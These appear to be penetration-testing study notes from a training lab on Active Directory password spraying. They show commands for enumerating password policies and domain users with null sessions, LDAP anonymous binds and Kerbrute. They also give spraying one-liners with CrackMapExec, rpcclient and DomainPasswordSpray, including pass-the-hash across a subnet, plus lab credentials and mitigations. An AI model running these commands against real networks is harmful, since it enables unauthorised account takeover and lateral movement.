--- ---

<h2>Enumerating & Retrieving Password Policies</h2>

---> Enumerating from Linux

- Enumerating password policy with CrackMapExec:
![[Pasted image 20221221220022.png]]

- Enumerating with rpcclient:
![[Pasted image 20221221220052.png]]

- Enumerating with enum4linux:
![[Pasted image 20221221220110.png]]

- LDAP Anonymous Bind (Enumerating from Linux):
	LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

Tools you can use:
	- windapsearch.py
	- ldapsearch
	- ad-ldapdomaindump.py

- Using ldapsearch
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```


---> Enumerating from Windows

- Using net.exe
![[Pasted image 20221221220150.png]]

- Using PowerView
![[Pasted image 20221221220226.png]]

---

<h2>Password Spraying - Making a Target User List</h2>

Ways to gather a target list of valid users:
- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller

- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list

- Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the stastically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users

- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist

Using enum4linux:
```
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

Using rpcclient:
```
rpcclient -U "" -N 172.16.5.5
```

```
rpcclient $> enumdomusers
```

Using crackmapexec:
```
crackmapexec smb 172.16.5.5 --users
```

Using ldapsearch:
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

Using windapsearch.py:
```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

Using Kerbrute:
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 <wordlist>
```

Building our User List
Using CrackMapExec with Valid Credentials:
```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

---

<h2>Internal Password Spraying</h2>

---> Linux

Using a Bash one-liner for the Attack:
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Using Kerbrute:
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5
valid_users.txt Welcome1
```

Using CrackMapExec:
```

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

Validating Credentials with CrackMapExec:
```
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```


- Local Admin Password Reuse
	Internal password spraying is not only possible with domain user accounts. If you obtain administrative access and the NTLM password hash or cleartext password for the local administrator account (or another privileged local account), this can be attempted across multiple hosts in the network. Local administrator account password reuse is widespread due to the use of gold images in automated deployments and the perceived ease of management by enforcing the same password across multiple hosts. CrackMapExec is a handy tool for attempting this attack. It is worth targeting high-value hosts such as SQL or Microsoft Exchange servers , as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.

Local Admin Spraying with CrackMapExec:
```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H
88ad09182de639ccc6579eb0849751cf | grep +
```


---> Windows

From a foothold on a domain-joined Windows host, the DomainPasswordSpray tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.

Syntax:
```
Import-Module
.\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -
ErrorAction SilentlyContinue
```

---

<h2>Mitigations</h2>

Multi-Factor Auth: Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.

Restricting Access: It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.


Reducing Impact of Successful Exploitation: A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.

Password Hygiene: Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.